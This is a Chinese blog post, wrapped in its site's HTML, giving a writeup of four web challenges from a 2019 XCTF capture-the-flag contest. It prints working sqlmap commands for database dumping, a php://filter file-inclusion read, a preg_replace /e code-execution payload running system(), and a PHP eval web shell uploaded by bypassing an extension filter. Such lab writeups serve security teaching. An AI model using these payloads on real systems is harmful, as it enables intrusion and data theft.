@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>赛博地球杯网安大赛web部分Writeup | Cryscat&#39;s Blog | 一只安全狗</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#000000">
+    
+    
+    <meta name="keywords" content="XCTF,Writeup">
+    <meta name="description" content="0X00 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;菜却坚强…… 0X01 大量设备报表不见了&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;爆破id">
+<meta name="keywords" content="XCTF,Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="赛博地球杯网安大赛web部分Writeup">
+<meta property="og:url" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/index.html">
+<meta property="og:site_name" content="Cryscat&#39;s Blog">
+<meta property="og:description" content="0X00 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;菜却坚强…… 0X01 大量设备报表不见了&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;爆破id">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/1.jpg">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/2.jpg">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/3.jpg">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/4.jpg">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/5.jpg">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/6.jpg">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/7.jpg">
+<meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/8.jpg">
+<meta property="og:updated_time" content="2019-03-03T14:30:42.949Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="赛博地球杯网安大赛web部分Writeup">
+<meta name="twitter:description" content="0X00 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;菜却坚强…… 0X01 大量设备报表不见了&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;爆破id">
+<meta name="twitter:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/1.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Cryscat&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/mm.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Cryscat</h5>
+          <a href="mailto:cry3c4t@gmail.com" title="cry3c4t@gmail.com" class="mail">cry3c4t@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Cryscat" target="_blank">
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://www.weibo.com/" target="_blank">
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">赛博地球杯网安大赛web部分Writeup</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">赛博地球杯网安大赛web部分Writeup</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-03-03T09:44:35.000Z" itemprop="datePublished" class="page-time">
+  2019-03-03
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0X00-前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">0X00 前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0X01-大量设备报表不见了"><span class="post-toc-number">2.</span> <span class="post-toc-text">0X01 大量设备报表不见了</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0X02-工控管理系统新版本"><span class="post-toc-number">3.</span> <span class="post-toc-text">0X02 工控管理系统新版本</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0X03-工控云管理系统设备维护中心被植入后门"><span class="post-toc-number">4.</span> <span class="post-toc-text">0X03 工控云管理系统设备维护中心被植入后门</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0X04"><span class="post-toc-number">5.</span> <span class="post-toc-text">0X04</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-赛博地球杯网安大赛web部分Writeup" class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">赛博地球杯网安大赛web部分Writeup</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-03-03 17:44:35" datetime="2019-03-03T09:44:35.000Z" itemprop="datePublished">2019-03-03</time>
+
+            
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/1.jpg" title="Hello!">
+<h1 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;菜却坚强……</p>
+<h1 id="0X01-大量设备报表不见了"><a href="#0X01-大量设备报表不见了" class="headerlink" title="0X01 大量设备报表不见了"></a>0X01 大量设备报表不见了</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/2.jpg"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;爆破id试试<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/3.jpg"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;id=2333时爆出flag</p>
+<h1 id="0X02-工控管理系统新版本"><a href="#0X02-工控管理系统新版本" class="headerlink" title="0X02 工控管理系统新版本"></a>0X02 工控管理系统新版本</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大致浏览一下有login.php，regist.php，findpwd.php这三个页面<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在findpwd.php页面发现搜索框存在sql注入并且fuzz测试无任何过滤，直接上sqlmap吧，懒得动手了</p>
+<p>爆数据库名：cetc004</p>
+<blockquote>
+<p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” –dbs</p>
+</blockquote>
+<p>爆表名：user</p>
+<blockquote>
+<p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” -D cetc004 –tables</p>
+</blockquote>
+<p>爆列名：answer,password,question,username</p>
+<blockquote>
+<p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” -D cetc004 -T user –columns</p>
+</blockquote>
+<p>爆内容：没想多少干脆全爆出来，愣是跑了近一个小时，后悔了……其实只要将username爆出来就行了，密码是md5加密的，到处解没解出来</p>
+<blockquote>
+<p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” -D cetc004 -T user -C “answer,password,question,username” –dump</p>
+</blockquote>
+<img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/4.jpg">
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号在登录进去就能getflag了<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/5.jpg"></p>
+<h1 id="0X03-工控云管理系统设备维护中心被植入后门"><a href="#0X03-工控云管理系统设备维护中心被植入后门" class="headerlink" title="0X03 工控云管理系统设备维护中心被植入后门"></a>0X03 工控云管理系统设备维护中心被植入后门</h1><p><a href="http://111.198.29.45:32548/index.php?page=index" target="_blank" rel="noopener">http://111.198.29.45:32548/index.php?page=index</a><br>看到这url第一反应就是文件包含</p>
+<blockquote>
+<p><a href="http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a></p>
+</blockquote>
+<img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/6.jpg">
+<p>拿去base64解密<br>关键部分代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码审计可知要将XFF改为127.0.0.1才能触发后门。这是一个preg_replace()后门。/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。但要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含preg_replace() 的行中出现语法解析错误。<br>payload:</p>
+<blockquote>
+<p>pat=/a/e&amp;rep=phpinfo()&amp;sub=a</p>
+</blockquote>
+<p>之后可以通过system()等函数命令执行</p>
+<blockquote>
+<p>pat=/a/e&amp;rep=system(“cat s3chahahaDir/flag/flag.php”)&amp;sub=a</p>
+</blockquote>
+<p>查看源代码getflag<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/7.jpg"></p>
+<h1 id="0X04"><a href="#0X04" class="headerlink" title="0X04"></a>0X04</h1><p>题目给了源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">       <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">       $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">       $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">       $result = mysql_query($sql);</span><br><span class="line">       $result = mysql_fetch_object($result);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       $result = <span class="keyword">False</span>;</span><br><span class="line">       <span class="keyword">die</span>();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">     <span class="keyword">if</span>($result)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">       $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这一段代码中我们需要绕过<code>if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;)</code>使<code>$_SESSION[&#39;admin&#39;] = True</code>。此外还有一个隐藏的限制：mysql查询结果的限制，id大了查询不到。我们可以构造<code>id=1\09</code>来绕过这部分限制。<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/8.jpg"></p>
+<p>第二部分代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">      $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">      $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">      $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">          $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">          fwrite($f, $con);</span><br><span class="line">          fclose($f);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里的<code>$filename = &quot;backup/&quot;.$file;</code>目录为假目录需要绕过。</li>
+<li>正则表达式<code>if(preg_match(&#39;/.+\.ph(p[3457]?|t|tml)$/i&#39;, $filename))</code>对文件后缀进行过滤</li>
+<li>真实的上传目录为uploaded<br>我们可以通过$file加../绕过假目录。正则匹配只匹配最后一个点的后缀，可以通过<code>cryscat.php/.</code>绕过。</li>
+</ul>
+<p>payload(post)</p>
+<blockquote>
+<p>con=&lt;?php @eval($_POST[‘cryscat’]);?&gt;&amp;file=cryscat.php/.</p>
+</blockquote>
+<p>之后用菜刀连接就行了，flag在html文件夹的flag.php文件中。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://cryscat.com">
+            <img src="/img/avatar.jpg" alt="Cryscat">
+            Cryscat
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Writeup/">Writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XCTF/">XCTF</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/&title=《赛博地球杯网安大赛web部分Writeup》 — Cryscat's Blog&pic=http://cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/&title=《赛博地球杯网安大赛web部分Writeup》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《赛博地球杯网安大赛web部分Writeup》 — Cryscat's Blog&url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/&via=http://cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/01/02/Markdown语法/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Markdown语法</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="bottom">
+        <p><span>Cryscat &copy; 2018 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/&title=《赛博地球杯网安大赛web部分Writeup》 — Cryscat's Blog&pic=http://cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/&title=《赛博地球杯网安大赛web部分Writeup》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《赛博地球杯网安大赛web部分Writeup》 — Cryscat's Blog&url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/&via=http://cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACr0lEQVR42u3aQW4bMRAEQP//0w6QUwBjle4ZUvKh9iTI9pLFAznu4ddX/Hz/ff79/PObp99/+ubn257+6umnxx48PDy80dSfnna6r9+fjPg0bv4GPDw8vPfwksOg3ejzt70eJVnux+/x8PDwPspLtunNtNoR8fDw8H4/L9n6Z8FEXkbj4eHh/R5eEgrsw4JZbPGmrAUPDw8v5s0aYJ/9fL2/h4eHhzfqqufb7qy8buOGep54eHh4F3ivp3L2KkBbuM/i3Wi6eHh4eAveqSHbmDV/5yYKwcPDw7vHa5th+fCzsruNHh6XFQ8PD+8abx9AtKHDpomVX1DAw8PDu8HLt+Pkde3k9gV0XpTj4eHh3eBtprvZ7vPLWO0xg4eHh/dOXrJlt+2xNt5tl/U/M8TDw8O7wEuGyYecXSw4HD3g4eHhvYU3Y+TLkR8YOfhY4oKHh4cX8/br0UYSm/K9Pkjw8PDwrvHaUnUDSErqtg22Slnw8PDwYt6sQVU3n8pJtwfA43vw8PDwLvByRh7Lvi7T2wMjD0eGNyPw8PDwSl7byM8B+VWq2aWrKHTGw8PDu8abNebzy1WnwHU7DQ8PD+8abxPUzsro2ZHQtt/w8PDw7vH2MUFywCT4tqQeNsDw8PDwFrw2om2L3bbxv493o0tXeHh4eCc78qtgd9/gnwUcydGCh4eHd5aXRAztJDZ/lZfpw/8b8PDw8K7xZlPJ2/zt789acXh4eHhned/lc6CdPwos8igZDw8P7zYvf2YFdH1GxQuULxYeHh7eDd6p4nh/YSuPM4qDAQ8PD+8ab3PVKT8kNu9pIwk8PDy838NLrp+2QXBboBeXEvDw8PA+ynu9WSe8NibO22YHDgY8PDy8kreZXDLwJnRolwAPDw/vNm/TANt029oiu11cPDw8vAu8P4k5iL0mCWLOAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '你去哪啦！(｡•ˇ‸ˇ•｡)';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来！( • ̀ω•́ )✧';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
